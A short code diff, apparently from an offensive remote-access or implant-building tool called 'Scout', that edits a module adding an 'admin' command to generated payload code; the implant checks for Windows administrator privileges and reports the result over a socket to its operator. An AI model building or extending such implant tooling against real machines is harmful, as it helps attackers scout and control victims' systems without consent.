@@ -12,7 +12,7 @@ def main(option):
         config.import_statements.append('from ctypes import windll')
         config.functions.append('''
 def admin():
-    s.sendall(('[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0)).encode())''')
+    main_send('[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0), s)''')
         config.logics.append('''
             elif command == "admin":
                 admin()''')
